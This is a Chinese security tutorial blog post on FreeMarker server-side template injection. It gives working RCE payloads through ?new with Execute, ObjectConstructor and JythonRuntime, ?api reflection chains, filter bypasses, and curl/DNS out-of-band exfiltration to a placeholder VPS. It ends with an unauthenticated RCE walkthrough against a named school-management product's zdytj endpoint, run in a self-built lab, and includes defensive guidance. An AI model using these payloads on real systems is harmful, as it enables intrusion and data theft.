layout: post
title: "FreeMarker SSTI 全体系：从模板原理、检测指纹到类解析绕过与回显工程（附正方教务未授权 RCE 实战）"
date: 2026-10-26 20:30:00 +0800
author: Security Researcher
categories: [网络安全, Java安全]
tags: [Java安全, FreeMarker, SSTI, 模板注入, SQL注入, RCE, CTF, 代码审计, 内置方法, 沙箱逃逸]
description: "体系化讲解 FreeMarker 模板注入：FTL 语法全要素、SSTI 检测与指纹识别方法论、?new/?api/?eval 利用面、Execute/ObjectConstructor/JythonRuntime 危险类、无回显 OOB、沙箱与 TemplateClassResolver 防御、版本演进时间线；再以独立章节系统拆解 SQL 预解析器的两阶段白名单设计与'引号列位置注入'通病；最后以正方教务 zdytj 未授权 RCE 作端到端实战收尾。"
---

> **免责声明**：本文仅用于本地靶场学习、CTF 训练与授权安全研究。所有示例默认作用于 `127.0.0.1` 或自建环境，请勿对未授权系统做任何测试。理解这些攻击模型同样是防御方的基本功，请以防御视角阅读本文。

---

## 全文地图

很多人第一次接触 FreeMarker SSTI，是从一段现成 payload 开始的：抄一段 `<#assign x="freemarker.template.utility.Execute"?new()>`，打不通就换下一个。这篇文章想反过来，把知识先讲成体系，再用一个真实案例收尾：

- **第一部分** FreeMarker 模板引擎：语法全要素与执行模型
- **第二部分** SSTI 通用方法论：六问清单、探测、指纹识别
- **第三部分** FreeMarker 利用技术：`?new` 三大危险类、`?eval`/`?interpret`、`?api` 反射链、版本演进
- **第四部分** 回显工程：有回显、无回显（OOB）
- **第五部分** 防御体系：沙箱配置与"SAFER 不是银弹"
- **第六部分** SQL 预解析专题：两阶段白名单设计与"引号列位置注入"通病
- **第七部分** 实战：正方教务 `zdytj` 未授权 SSTI 到 RCE 全流程
- **第八部分** Payload 与报错速查

---

# 第一部分 FreeMarker 模板引擎

## 1.1 模板引擎是什么

所有模板引擎的工作模型都是同一个三元组：

```
模板（Template，开发者写的带占位符的文本）
  + 数据模型（Data Model，程序运行时传入的变量）
  → 输出（HTML、邮件、报表等最终文本）
```

FreeMarker 是 Java 生态最常用的模板引擎之一，模板文件后缀 `.ftl`，典型调用：

```java
Configuration cfg = new Configuration(Configuration.VERSION_2_3_23);
Template template = cfg.getTemplate("mail.ftl");
Map<String, Object> dataModel = new HashMap<>();
dataModel.put("user", "张三");
template.process(dataModel, writer);   // 渲染发生在这里
```

**漏洞根源一句话：模板即代码。** 模板里的语法不是"显示用的占位符"，而是会被引擎真正执行的表达式与指令。只要用户可控数据被拼进**模板字符串本身**（而不是作为数据模型传入），用户写什么，引擎就执行什么——与 SQL 注入"数据被当作代码"是同一个本质。

## 1.2 FTL 语法全要素

FreeMarker 模板（FTL）由四类元素构成：

| 元素 | 形态 | 作用 |
|---|---|---|
| 插值（interpolation） | `${expression}`、`#{numeric}` | 求值表达式并输出结果 |
| FTL 标签（directive） | `<#directive ...>`、`</#directive>`、`<@macro>` | 赋值、流程控制、包含、宏 |
| 文本 | 任意字符 | 原样输出 |
| 注释 | `<#-- comment -->` | 不输出 |

### 常用指令速查

```ftl
<#-- assign：创建/覆盖变量，SSTI 中最常用的指令 -->
<#assign name = "value">
<#assign x = "freemarker.template.utility.Execute"?new()>

<#-- 条件与循环 -->
<#if x?length gt 3>...</#if>
<#list items as item>${item}<#sep>, </#list>

<#-- 包含与导入 -->
<#include "/etc/passwd">
<#import "lib.ftl" as lib>

<#-- 宏定义 -->
<#macro greet>hello</#macro>

<#-- 引擎设置 -->
<#setting number_format="computer">
```

### 内建函数（builtin）体系

内建函数以 `?` 挂在表达式后面，是 FTL 表达式能力的核心。按 SSTI 相关性分组：

| 分组 | 示例 | 相关性 |
|---|---|---|
| 字符串处理 | `?length` `?upper_case` `?trim` `?replace("a","b")` `?substring(0,3)` `?split(",")` | **高**：`?trim`、`?replace` 是回显整形主力（见第四部分） |
| 对象实例化 | `?new` | **致命**：按类名实例化任意 Java 类，SSTI 核心入口 |
| API 暴露 | `?api` | **高危**：暴露对象的 Java 方法调用（默认关闭） |
| 二次执行 | `?eval` `?interpret` | **高危**：把字符串再次当表达式 / 整段模板执行 |
| 默认值 | `?default("")`、`!` 操作符、`?has_content` | 中：构造容错 payload |
| 类型判断 | `?is_string` `?is_number` `?c` | 中 |

`?eval` 与 `?interpret` 值得单独记一笔：前者把字符串当 FreeMarker **表达式**求值，后者把字符串当**整段模板**渲染。它们意味着即使输入被包了一层字符串、被编码或被拼接，只要最终能流进 `?eval`/`?interpret`，依然可达代码执行——这也是过滤类绕过的重要通道（见 3.5）。

### 特殊变量与环境探测

| 变量 | 含义 | 黑盒用途 |
|---|---|---|
| `.version` | 引擎版本，如 `2.3.23` | 最直接的版本指纹 |
| `.data_model` | 当前数据模型哈希视图 | 枚举暴露进模板的对象，寻找反射入口 |
| `.globals` | 全局共享变量 | 同上 |
| `.lang` `.locale` `.time_zone` | 运行环境 | 信息收集 |
| `.now` | 当前时间 | 存在性探针（Velocity 会原样输出 `${.now}`，可区分引擎） |

`.data_model` 在黑盒阶段尤其重要：数据模型里暴露了哪些对象，决定"不靠 `?new` 还能干什么"。

## 1.3 执行模型：先解析成 AST，再执行

FreeMarker 处理模板分两遍：先把模板**解析为语法树**（此阶段做词法/语法检查），再**执行**语法树（此阶段才真正求值插值与指令）。由此得到两个重要推论：

1. **语法错误在渲染前就暴露**：模板解析失败抛 `ParseException`，与执行期异常（类被拉黑、方法不存在）是不同性质的错误。响应差异能帮你区分"payload 写错了"还是"被防护拦了"。
2. **字符串内容的语法在渲染时才生效**：模板里写在字符串字面量中的 `<#assign>` 之类，对 FreeMarker 而言依然是模板语法吗？——不是。**字符串里的 FTL 不会被执行**，除非该字符串流经 `?interpret`/`?eval`。这一点与第六部分的 SQL 预解析直接相关：靶场里预解析器放行的正是"字符串形态"，而真正的执行发生在引擎把**整条 tjsql** 当模板解析时——单引号在 FTL 里不是字符串定界符，FTL 的字符串定界符是双引号和单引号都可以，需要读者在实际环境中以响应为准做区分（本案例中单引号内指令被执行，是因为整条 tjsql 被引擎整体解析，单引号只是普通文本字符，不构成 FTL 字符串）。理解"谁在哪个阶段把什么当什么"是所有绕过的根基。

---

# 第二部分 SSTI 通用方法论

## 2.1 动手前的六个问题

参考社区沉淀的利用检查清单，打任何 SSTI 前先回答：

| # | 问题 | 影响 |
|---|---|---|
| 1 | 用户输入进入模板的哪个位置？整段模板 / 拼接片段 / `?eval` / `?interpret` / 仅数据模型 | 决定能写多少语法 |
| 2 | 引擎版本？（`${.version}`） | 决定默认防护与可用 payload |
| 3 | `?new` 的类解析器是否被限制？（UNRESTRICTED / SAFER / ALLOWS_NOTHING） | 决定 Execute 直路是否可用 |
| 4 | `?api` 是否开启？成员访问策略版本？ | 决定 `?api` 反射路线可行性 |
| 5 | 有没有回显？响应体 / 错误页 / 外带通道 | 决定结果怎么拿 |
| 6 | 数据模型里暴露了哪些对象？ | 决定"无 `?new`"时的反射路线 |

## 2.2 探测：确认"输入被执行了"

第一步永远是确认服务端真的在求值你的输入，用纯算术探针，无攻击特征、不易触发告警：

```
${7*7}    → 49     ${} 类引擎通用，存在 SSTI
```

## 2.3 指纹识别：确认是哪个引擎

各模板引擎语法相近，payload 却互不通用，先分辨引擎再打：

| 探针 | FreeMarker | Velocity | Jinja2/Twig | Thymeleaf |
|---|---|---|---|---|
| `${7*7}` | 49 | 49 | 49（Jinja2 用 `{{7*7}}`） | 49 |
| `{{7*7}}` | 原样输出（不支持） | 原样输出 | 49 | 原样输出 |
| `${"z"+"z"}` | `zz`（`+` 拼接） | 报错 | 报错/原样 | 报错 |
| `${7*"7"}` | **报错 ParseException（Expecting: number）**——FreeMarker 特征性失败 | — | Jinja2 报 TypeError | — |
| `${.version}` | 版本号 | — | — | — |
| `${.now}` | 输出日期时间 | — | — | — |

三个最有区分度的特征：`{{7*7}}` 原样输出排除 Jinja2/Twig 系；`${7*"7"}` 的**解析期**报错是 FreeMarker 标志（对应 1.3 的"解析先于执行"）；`${.version}` 直接给版本。版本确认后，对照第三部分的版本时间线选打法。

## 2.4 信息收集

```
${.version}                    引擎版本
${.data_model?keys?join(",")}  数据模型键名枚举（若可回显）
${.lang} ${.locale}            运行环境
${System.getenv()}             若环境变量直接暴露在模型中（少见，但值得一试）
```

信息收集的目标是回答 2.1 的第 6 问：数据模型里有没有能反射的 POJO、`Map`、`List` 或框架对象。

---

# 第三部分 FreeMarker 利用技术

## 3.1 `?new` 与类解析器：一切的核心开关

`?new` 按类名实例化对象。实例化走的不是"任意反射"，而是 FreeMarker 的 **TemplateClassResolver** 类解析器，三档：

| 解析器 | 行为 |
|---|---|
| `UNRESTRICTED_RESOLVER` | 任意类（2.3.x 默认） |
| `SAFER_RESOLVER` | 除 `Execute`、`ObjectConstructor`、`JythonRuntime` 三个已知危险类外放行 |
| `ALLOWS_NOTHING_RESOLVER` | 禁止一切 `?new` |

被 SAFER 拦截时的标志性报错：

```
Instantiating freemarker.template.utility.Execute is not allowed in the template for security reasons.
```

**关键结论：2.3.x 全系默认 UNRESTRICTED**，因为向后兼容一直没改默认值，直到 2.4.0 才计划默认 SAFER。也就是说，只要目标用的是 2.3.x 且应用没显式配置解析器，`?new` 就是完全开放的。

## 3.2 Execute：最直接的命令执行

`freemarker.template.utility.Execute` 实现了 `TemplateMethodModel`，内部封装 `Runtime.getRuntime().exec(String)` 并返回 stdout。三种等价写法：

```ftl
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")}
${"freemarker.template.utility.Execute"?new()("id")}   单行表达式形式（适合只有 ${} 插值位的场景）
```

**两个必须刻在脑子里的实现细节**（决定 payload 形态）：

1. **只取第一个参数**：`exec(List)` 中 `arguments.get(0)` 之后的参数全部被丢弃。所以 `x("sh","-c","id")` 实际执行的是 `Runtime.exec("sh")`——无参数的 `sh` 等待 stdin，**请求直接挂死**。命令与参数必须合并在一个字符串里。
2. **不经过 shell**：`Runtime.exec(String)` 按空白分词直接创建进程，`|`、`>`、`>`、`;`、`&&`、`$()`、通配符 `*` 全部没有 shell 语义。`x("echo hi > /tmp/x")` 不会创建文件，`x("cat /flag*")` 不会展开通配符。

需要 shell 特性（管道、重定向、命令替换）时，换 3.3 的 ProcessBuilder 路线。

## 3.3 ObjectConstructor：构造任意类

`freemarker.template.utility.ObjectConstructor` 按类名反射调用构造器，创建的对象不受 `TemplateModel` 限制，方法可链式调用。经典组合拳——ProcessBuilder 读回显：

```ftl
<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
<#assign pb=oc("java.lang.ProcessBuilder",["sh","-c","id"])>
<#assign p=pb.start()>
<#assign isr=oc("java.io.InputStreamReader",p.getInputStream())>
<#assign br=oc("java.io.BufferedReader",isr)>
${br.readLine()}
```

要点：

- 传 `["sh","-c","..."]` **列表**形式，由真实 shell 解释，管道、重定向、命令替换全部可用；
- 多行输出用 `sc.useDelimiter("\\A").next()` 一次读全（Scanner 路线），或多次 `readLine()` 拼接；
- 读文件不需要 RCE：`oc("java.util.Scanner", oc("java.io.File","/flag").toPath())` 之类的组合即可。

**为什么这条链经常能成**：黑名单通常按"类名字符串"拉黑 `Runtime.getRuntime` / `exec`，但 `ProcessBuilder` 的实例方法 `start()`、`InputStreamReader`、`BufferedReader` 往往不在名单里。类名黑名单防"实例化"，防不住"方法调用链"。

## 3.4 JythonRuntime：模板里跑 Python

`freemarker.template.utility.JythonRuntime` 允许在模板中执行 Jython（Python）代码：

```ftl
<#assign value="freemarker.template.utility.JythonRuntime"?new()>
<@value>import os; os.system("id")</@value>
```

前提是 classpath 上有 Jython 依赖（`org.python.*`），否则抛 `NoClassDefFoundError`。三个原生危险类中它对部署环境要求最苛刻，但在 Java 应用里 Jython 并不罕见。

## 3.5 `?eval` 与 `?interpret`：二次执行通道

```ftl
<#assign t = payload?interpret><@t/>
${payload?eval}
```

`?interpret` 把字符串当**整段模板**渲染，`?eval` 把字符串当**表达式**求值。两个用途：

- **绕输入位置限制**：如果注入点本身只允许表达式（例如输入被放在 `${...}` 内部），可以用表达式形式完成"定义 + 调用"：`${"freemarker.template.utility.Execute"?new()("id")}`；
- **二次解码**：输入被过滤/转义后存进数据模型，渲染时经 `?interpret` 释放。

注意：`?interpret`/`?eval` 内部再出现 `?new` 仍走同一个类解析器——SAFER 拦得住它们内部的 `?new`；但 `?interpret`/`?eval` 本身不受类解析器限制，可用于调用数据模型中已有对象的方法。

## 3.6 `?api` 与完整反射链

`?api` 把包装对象的真实 Java API 暴露给模板（2.3.22 引入，`api_builtin_enabled` **默认 false**）。一旦应用显式开启且成员访问策略宽松，就能打出完整反射 RCE：

```ftl
<#assign cl=bean?api.getClass().getClassLoader()>
<#assign rt=cl.loadClass("java.lang.Runtime").getMethod("getRuntime").invoke(null)>
<#assign p=rt.exec("id")>
<#assign scClass=cl.loadClass("java.util.Scanner")>
<#assign sc=scClass.getConstructor([cl.loadClass("java.io.InputStream")]).newInstance([p.getInputStream()])>
<#assign sc=scClass.getMethod("useDelimiter",[cl.loadClass("java.lang.String")]).invoke(sc,["\\A"])>
${scClass.getMethod("next",[]).invoke(sc,[])}
```

两个著名的坑：

1. **用应用自身 POJO 拿 ClassLoader**：JDK 核心类（如 `ArrayList`）由 Bootstrap ClassLoader 加载，`getClassLoader()` 返回 null；
2. **Scanner 实现了 `Iterator` 被当作集合**，直接 `sc.useDelimiter(...)` 会抛 `NonHashException`，须用 `getMethod().invoke()` 反射绕过包装。

## 3.7 数据模型对象方法链：没有 `?new` 也能打

即使 `?new` 被完全禁掉，只要数据模型暴露了 Java 对象，成员访问（`obj.method()`）依然可用。配合默认成员访问策略的疏漏，常见路线：`request`/`session` 对象、框架上下文、含危险 getter 的 POJO。这正是 2.1 清单第 6 问的价值。

## 3.8 版本安全时间线

结合社区整理的攻防史：

| 版本 | 变化 | 对利用的影响 |
|---|---|---|
| ≤ 2.3.16 | 无原生防护 | 蛮荒时代，三个危险类直接 RCE |
| 2.3.17 | 引入 `TemplateClassResolver` | 默认仍 UNRESTRICTED |
| 2.3.22 | 引入 `?api`，默认关闭 | `?api` 路线默认不可用 |
| 2.3.30 | 引入可插拔 `MemberAccessPolicy`（DefaultMemberAccessPolicy） | 拉黑 `Runtime.getRuntime`、`ClassLoader.loadClass`、`Field.get`、`URL.openConnection` 等 |
| 2.3.32 / 2.3.35 | 继续收紧 | 细节绕过更难 |
| 2.4.0 | 计划默认 `SAFER_RESOLVER` | 三个危险类默认被拦 |

**重要澄清**：2.3.x 因向后兼容，**默认配置下 `?new Execute` 始终是 RCE**。旧黑名单（"since 2.3.0"标注）拦的是 `Runtime.exec`、`Class.forName`、`Method.invoke` 等方法级访问，不等于拦 `Execute`。本系列后续案例（2.3.23）正处于这个"默认不设防"区间。

## 3.9 绕过思路汇总（过滤场景）

当目标对模板输入做了过滤时，社区沉淀的常见思路：

| 防护 | 思路 |
|---|---|
| 关键字过滤类名 | 字符串拼接 `"freemarker.template.utility."+"Execute"`、`?eval` 求值拼接结果 |
| 过滤 `<#` / `${` | 若存在 `?interpret` 通道，把 payload 编码后经数据模型释放 |
| 拦 Execute | ObjectConstructor + ProcessBuilder / JythonRuntime / `?api` 反射 |
| SAFER_RESOLVER | 类名级拉黑管不到 `?interpret`/`?eval` 与数据模型方法调用；`?new` 非法类的静态初始化副作用理论上也可作为 gadget |
| 输出过滤 | 见第四部分回显工程 |

---

# 第四部分 回显工程

## 4.1 有回显：三类通道

| 通道 | 形式 | 注意点 |
|---|---|---|
| 插值直接输出 | `${r}` | 结果出现在响应体 |
| 错误页回显 | 异常信息带出变量值 | 依赖 debug 配置 |
| 结构化回显 | 结果进入 JSON/列别名等固定字段 | 本系列案例采用（见第七部分） |

## 4.2 多行输出问题

命令输出普遍带换行。回显通道若对内容有格式约束（正则、JSON 字符串、SQL 词法），换行会破坏解析。两类对策：

```ftl
<#assign r=x("id")?replace("\n"," ")>    通用：换行折成空格，多行内容保得住
<#assign r=x("id")?trim>                  轻量：只去首尾空白，适合单行输出
```

注意 `Execute` 逐行读 stdout 后以换行拼接，**每行末尾的换行都在字符串里**，`?trim` 只处理首尾，多行内容必须 `?replace`。

## 4.3 无回显：带外（OOB）

响应拿不到结果时外带：

```ftl
<#-- HTTP 外带：结果 base64 后发到自己的服务器（base64 消掉空格与特殊字符） -->
<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
<#assign pb=oc("java.lang.ProcessBuilder",["sh","-c","curl http://your-vps/$(id|base64)"])>
<#assign p=pb.start()>sent

<#-- DNS 外带 -->
<#assign pb=oc("java.lang.ProcessBuilder",["sh","-c","ping -c 1 $(whoami).your.dnslog"])>
```

再次强调：这些 payload 之所以用 `["sh","-c",...]`，正是因为 `Execute` 不走 shell、`$()` 无效。OOB 是"盲打 SSTI"的标准解法。

---

# 第五部分 防御体系

## 5.1 根治：模板与数据分离

payload 千变万化，根因只有一个——用户输入进入了模板源码。用户数据必须且只能通过 `template.process(dataModel, writer)` 传入。凡是"把用户输入拼进模板再渲染"的代码，配什么沙箱都只是拖延时间。

## 5.2 类解析器与 API 开关

```java
// 拦掉三个已知危险类
cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
// 更彻底：禁止所有 ?new（推荐）
cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
// 关闭 ?api 通道（2.3.x 默认已关闭，显式声明防误开）
cfg.setAPIBuiltinEnabled(false);
// 模板只从固定目录加载
cfg.setDirectoryForTemplateLoading(new File("/app/templates"));
```

## 5.3 "SAFER 不是银弹"

| 仍可用 | 说明 |
|---|---|
| `?interpret` / `?eval` | 本身不受类解析器限制，可调数据模型对象方法 |
| 数据模型对象方法链 | 含危险 getter/方法的 POJO 暴露进模板即可利用 |
| `?api`（若误开） | 完整反射 |
| classpath 上的自定义 `TemplateModel` | SAFER 只拉黑三个类名，不认识你自己的危险类 |

结论：类解析器是纵深防御的一层，不是终点；`ALLOWS_NOTHING` 优于 `SAFER`，且必须配合"输入不进模板"。

## 5.4 工程侧措施

- 升级 FreeMarker 至 2.3.30+ 并保持默认成员访问策略（拉黑 `Runtime`/`ClassLoader` 等方法级访问）；
- WAF/网关层拦截 `<#assign`、`?new(`、`freemarker.template.utility` 等特征；
- 应用降权运行、限制出网，压低 RCE 后果；
- 对动态模板类业务（邮件模板、报表模板）提供**占位符替换**而非完整 FTL。

---

# 第六部分 SQL 预解析专题

这部分脱离具体产品，把"SQL 预解析"作为一个独立命题讲清楚：它是什么、为什么会出现、正确与错误的设计长什么样、以及一个贯穿全文的通病——**校验时态错位**。

## 6.1 先分清两个"预解析"

安全语境里"预解析"至少指两件不同的事，混为一谈会出大问题：

| 概念 | 是什么 | 与注入的关系 |
|---|---|---|
| 数据库预编译（PreparedStatement） | SQL 骨架先发给数据库编译，参数经 `setXxx` 以**数据**身份绑定 | **防注入正解**：参数永远不进入 SQL 语法层 |
| 应用层 SQL 预解析（本文主题） | 应用在把 SQL 交给下一步处理**之前**，自己用正则/词法分析做形态校验或结构提取 | 防护效果取决于实现，本身就是常见漏洞点 |

为什么会有后者？很多业务并不真正执行 SQL，而是要**解析**它：报表设计器要从 SQL 里提取"列定义"给前端表格渲染；自定义查询要把用户写的 SQL 拆解、改写、加权限过滤条件。这些场景拿不到 PreparedStatement 的保护（SQL 本身就是输入），于是开发者自研"预解析器"做白名单校验。这类自研解析器在 Java 业务系统（尤其是带报表/统计功能的 ERP、教务、OA）里相当常见。

## 6.2 一个典型两阶段预解析器

以本文第七部分实战所用的靶场实现为例（行为逐条对齐真实线上观测），预解析器分两个阶段：

**阶段一：渲染前，作用于原始输入**

```java
// 列别名的三种合法形态：双引号 / 反引号 / 裸标识符
private static final String ALIAS =
        "(?:\"[^\"]*\"|`[^`]*`|[A-Za-z_$][A-Za-z0-9_$]*)";

// 骨架白名单：只放行 select '单引号字符串' as 列别名 from dual
private static final Pattern RAW_SHAPE = Pattern.compile(
        "^\\s*select\\s+'[^']*'\\s+as\\s+" + ALIAS + "\\s+from\\s+dual\\s*$",
        Pattern.CASE_INSENSITIVE);
```

**阶段二：渲染后，作用于最终文本**

```java
// 渲染结果必须仍是合法骨架，且别名中禁止 \r \n（多行输出会破坏 SQL 词法）
private static final Pattern RENDERED_SHAPE = Pattern.compile(
        "^\\s*select\\s+'[^'\\r\\n]*'\\s+as\\s+(\"[^\"\\r\\n]*\"|...)"
                + "\\s+from\\s+dual\\s*$",
        Pattern.CASE_INSENSITIVE);
```

逐段拆解这个正则，每一部分都是攻防信息：

| 片段 | 含义 | 攻防含义 |
|---|---|---|
| `^\s*select` | 必须 select 开头 | 排除 union/子查询等其他注入位 |
| `\s+'[^']*'` | select 后必须是**单引号字符串列** | 内容为任意非单引号字符——**白名单只看骨架不看内容** |
| `\s+as\s+` | 必须显式别名 | 别名是后续回显出口 |
| `ALIAS` | 双引号/反引号/裸标识符 | 双引号内可含空格——为"塞表达式"留了空间 |
| `from\s+dual\s*$` | 固定表 + `$` 锚定 | 末尾不能再拼东西，`$` 阻断了尾注释截断 |
| `CASE_INSENSITIVE` | 大小写不敏感 | 与 Oracle 语法兼容 |
| `[^'\r\n]*`（阶段二） | 字符串与别名中禁止换行 | 多行输出即解析失败（第七部分会用到） |

为什么骨架长这样？`select '字面量' as "别名" from dual` 是 Oracle 的合法语法，`dual` 是 Oracle 的单行哑表。这个接口的业务就是"解析列定义"，真实系统中用户 SQL 本就来自前端报表配置器。

## 6.3 白名单设计的两个哲学缺陷

**缺陷一：骨架白名单不等于内容白名单。**

`'[^']*'` 只排除单引号本身，`<`、`#`、`$`、`{`、`?`、`(` 全部放行。也就是说：**校验层眼中这是"一段普通字符串"，而在下游的模板引擎眼里，这段字符串的内容可能是活的语法。** 只要这个字符串最终流经任何"会求值"的组件（模板引擎、表达式引擎、反序列化器），骨架合法性就毫无意义。

**缺陷二：校验时态错位（本质是 TOCTOU）。**

预解析校验的是**原始输入**，而下游执行的是**渲染结果**——两者不是同一份数据。任何在"校验之后"才引入的变换（模板渲染、编码解码、拼接、二次解析）都会使校验结论失效。这是所有"先校验后处理"管线的通病，同类问题遍布：文件上传校验文件名后重命名、SSRF 校验 URL 后跟随跳转、WAF 检测原文后网关解码。

把两个缺陷组合，就得到一个可以命名的技术：**引号列位置注入**——把"会被下游求值的语法"藏进白名单允许的字符串列里，借下游的求值行为执行。识别它的特征也很固定：**系统对输入先做形态白名单，随后又把输入（或其渲染产物）交给某个解释器**。

## 6.4 通用化：哪些系统该自查

- 报表/统计设计器（用户 SQL、表达式、公式进后端解析）；
- 动态查询构建器（前端传"查询描述"，后端拼 SQL 前做校验）；
- 规则引擎、审批流公式（自定义表达式）；
- 任何"模板 + SQL"混合渲染的场景（邮件/消息模板里带查询）。

自查清单：校验发生在哪一层？校验对象是原文还是最终文本？字符串内容之后会流经哪些解释器？渲染结果是否还会被再次解析？

## 6.5 正确姿势

- 白名单必须覆盖**最终形态**：在渲染与下游解析之间，对"渲染产物"再做一次内容级校验（示例中阶段二正则就是正确意识，但只拦了换行——它拦不住"别名内容本身是注入结果"这一事实，只能靠消除注入点解决）；
- 能结构化就别传 SQL 字符串：列定义用 JSON 数组传，后端组装，彻底消灭"解析用户 SQL"这个需求；
- 必须传 SQL 时，用真正的 SQL 解析库（如 JSqlParser）做 AST 级白名单，而不是正则匹配骨架；
- 永远不要把用户输入交给模板引擎渲染（见第五部分）。

---

# 第七部分 实战：正方教务 zdytj 未授权 SSTI 到 RCE

前面六部分是体系，现在用一个真实案例把它们全部用上。目标：正方软件「教学管理信息服务平台」（jwglxt，前端指纹 `zftal-ui-v5`）的自定义统计模块。2026 年 9 月社区披露其存在未授权 RCE（CN-SEC 编号 5416079，原文标注 0day、无需认证），公开披露的 PoC 形如：

```
POST /jwglxt/zdytj/zdytj_cxParserColumnWhithSQL.html HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

tjsql=select+%3C%23assign+x%3D%22freemarker.template.utility.Execute%22%3Fnew()%3E%24%7Bx(%22uname%22-r)%7D+from+dual
```

URL 解码后即：

```
tjsql=select <#assign x="freemarker.template.utility.Execute"?new()>${x("uname" -r)} from dual
```

下面在自建靶场（行为 1:1 还原线上观测）上完整走一遍，并解释公开 PoC **在这个接口上为什么打不通**——这正是本案例的教学价值：公开 payload 不是万能钥匙，读懂防护逻辑才能走通自己的路。

## 7.1 信息收集：从指纹到接口

登录页标题「教学管理信息服务平台」+ 静态资源路径 `/zftal-ui-v5-1.0.2/` 锁定正方教务。前端 JS 里有一张模块路由表：

```javascript
// /zftal-ui-v5-1.0.2/js/xtgl/common.js（节选）
var modules = {
    'zdytj.zdytj_cxTjmbList': '/jwglxt/zdytj/zdytj_cxTjmbList.html',
    'zdytj.zdytj_cxParserColumnWhithSQL': '/jwglxt/zdytj/zdytj_cxParserColumnWhithSQL.html',
    ...
};
```

`zdytj_cxParserColumnWhithSQL`（Parser Column With SQL，"用 SQL 解析列"）接口名自曝行为。匿名 POST 验证：无 Cookie、无 CSRF token 也有响应差异（而非登录跳转），未授权成立。

## 7.2 第一道门：公开 PoC 为什么 404

把公开 PoC 发出去，得到 Spring 的 Whitelabel 404。用第六部分的理论解释：接口先做**阶段一预解析**，而 PoC 把模板语法裸写在 select 列位置——既没有 `'[^']*'` 单引号字符串列，也没有 `as` 别名，骨架不匹配直接拒绝（响应层统一吞成 404）。

对照 6.3 缺陷二：**校验的是原文，渲染的是原文**（这点与本例实现有关——整条 tjsql 都会被送进 FreeMarker，包括单引号内外），所以绕过方式不是"逃逸引号"，而是**顺着白名单的骨架走**：把恶意语法放进它允许的位置。

## 7.3 第二道门：引号列位置注入探针

```
tjsql=select '<#assign b="hello">' as "${b}" from dual
```

响应：

```
HTTP 200
[{"field_guid":"field0","field_index":"\"hello\"","field_name":"\"hello\""}]
```

一发探针同时确认三件事：骨架被放行；`<#assign>` 被 FreeMarker 真实执行（别名变成了 hello 而非原文）；列别名随 JSON 回显——回显通道就是 `as "..."` 的位置。这正是 6.2 表格里"双引号内可含空格/表达式"所埋下的伏笔。

## 7.4 第三道门：类黑名单探测与 Execute 逃逸

直接打 Execute 之前，先按第二部分方法论探测防护。站点在 `?new` 的类解析环节挂了自建黑名单（精确 + 前缀匹配），黑盒下用"能否实例化"当布尔探针逐一测试：

| 探针类 | 请求（骨架同上，单引号内替换） | 响应 | 结论 |
|---|---|---|---|
| `java.lang.ProcessBuilder` | `oc("java.lang.ProcessBuilder","whoami")` | 404 | 拦截 |
| `java.io.File` | `oc("java.io.File","/etc/passwd")` | 404 | 拦截 |
| `java.lang.System` | `ob("java.lang.System").getProperty("os.name")` | 404 | 拦截 |
| `freemarker.template.utility.Execute` | `x("whoami")` | **200 + root** | **放行** |

结果与 3.1/5.3 的论断完全呼应：**类名黑名单是枚举，开发者盯着 JDK 的"危险类"名单写规则，却漏掉了模板引擎自带的工具类**。`Execute` 就在 `freemarker.template.utility` 包里，随引擎必然存在，却不在名单上。这正是黑名单式防护的系统性盲区——也解释了为什么 5.2 推荐直接 `ALLOWS_NOTHING_RESOLVER`。

## 7.5 第四道门：命令执行与多行回显处理

打通 Execute 后读命令输出。按 3.2 的实现细节写 payload：命令与参数合并单字符串。按 4.2 处理换行：

```
tjsql=select '<#assign x="freemarker.template.utility.Execute"?new()><#assign r=x("uname -a")?replace("\n"," ")>' as "${r}" from dual
```

响应（内核版本以空格分隔折成单行）：

```
HTTP 200
[{"field_index":"\"Linux ... 3.10.0-1160... x86_64\"","field_name":"..."}]
```

两个对照实验值得亲手做，加深对回显通道的理解：

- `x("id")` 不加处理 → 200 + `SQL无法正确被解析,请检查标点符号或者语法是否正确!`——对应 6.2 阶段二正则的 `[^'\r\n]*`：**命令执行了、输出也回来了，只是换行破坏了别名位置的 SQL 词法解析**。见到这句报错不要误判为"命令没执行"，换 `?trim` 单行命令验证即可区分；
- `x("ls /u01/dist-deluxe")` → 同样 200 + 解析失败——目录清单是多行输出（另外 `Execute` 不走 shell，多级路径没问题但通配符无效）。

## 7.6 闭环：读取 flag

靶场 flag 位于容器内 `/flag.php`（单行内容），直接：

```
tjsql=select '<#assign x="freemarker.template.utility.Execute"?new()><#assign r=x("cat /flag.php")?trim>' as "${r}" from dual
```

响应：

```
HTTP 200
[{"field_index":"\"MYCTF{xxxxxxx}\"","field_name":"\"MYCTF{xxxxxxx}\""}]
```

## 7.7 完整利用链复盘

| 步骤 | 动作 | 知识点回溯 |
|---|---|---|
| 1 | 指纹锁定正方教务，前端 JS 挖出未授权接口 | 第二部分方法论 |
| 2 | 公开 PoC 404，定位到阶段一骨架白名单 | 6.2 / 6.3 |
| 3 | 引号列注入探针 `hello` 打通渲染与回显 | 6.3 缺陷一 |
| 4 | 四发探针摸清黑名单，Execute 漏网 | 3.1 / 5.3 |
| 5 | `?replace` 折行解决多行输出 | 4.2 |
| 6 | `cat /flag.php?trim` 拿到 flag | 3.2 / 4.2 |

## 7.8 修复建议（面向该类系统）

1. 接口加鉴权与访问控制，杜绝匿名可达（cn-sec 原文的处置建议同此）；
2. 消灭"用户输入进模板"：tjsql 中的动态部分改为结构化传输（列定义用 JSON），或改用参数化查询；
3. FreeMarker 配置 `ALLOWS_NOTHING_RESOLVER` + `setAPIBuiltinEnabled(false)`（第五部分）；
4. 升级引擎版本并跟进厂商补丁（该厂商另有 CNVD-2026-25909 SQL 注入通告，宜一并排查）；
5. WAF 特征层拦截 `<#assign`、`?new(`、`freemarker` 等关键字作为纵深；
6. 排查历史日志中对该接口的异常 POST。

---

# 第八部分 速查

## 8.1 FreeMarker payload 速查

```ftl
${7*7}                                                    探测
${.version}                                               版本指纹
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
